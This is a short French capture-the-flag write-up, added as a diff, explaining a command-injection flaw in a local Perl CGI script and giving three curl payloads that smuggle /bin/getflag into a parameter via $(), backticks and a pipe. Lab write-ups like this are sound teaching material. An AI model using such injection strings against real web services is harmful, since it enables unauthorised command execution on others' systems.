@@ -1,0 +1,11 @@
+Dans le script donne, on y vois     print `echo $y 2>&1`   et on en deduis que
+l'on peut proceder a une injection de code.
+On remarque aussi que le programme utilise CGI donc on va devoir executer le
+programme et passer les parametres de la maniere suivante:
+curl http://localhost:4747?x=notre_parametre
+Pour notre injection, nous voulons bien entendu executer la commande getflag
+avec les droits de flag04 et voila donc quelques commandes qui auront a peu
+pres le meme comportement(nous donner le flag):
+curl http://localhost:4747?x=\$\(/bin/getflag\)
+curl http://localhost:4747?x=\`/bin/getflag\`
+curl http://localhost:4747?x=\|/bin/getflag
